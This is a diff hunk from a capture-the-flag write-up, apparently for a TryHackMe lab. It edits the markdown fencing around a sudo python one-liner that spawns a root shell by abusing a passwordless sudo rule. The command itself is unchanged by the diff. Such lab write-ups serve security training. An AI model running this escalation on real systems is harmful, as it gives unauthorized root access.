@@ -50,9 +50,9 @@ By providing sudo -l, we can run python with sudo without a password. Going to h
 
 ![sudo-l](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/THM%20-%20Basic%20Hack/14.PNG)
 
-'''
+`
 sudo python -c 'import os; os.system("/bin/sh")'
-'''
+`
 
 ![root](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/THM%20-%20Basic%20Hack/15.PNG)
 
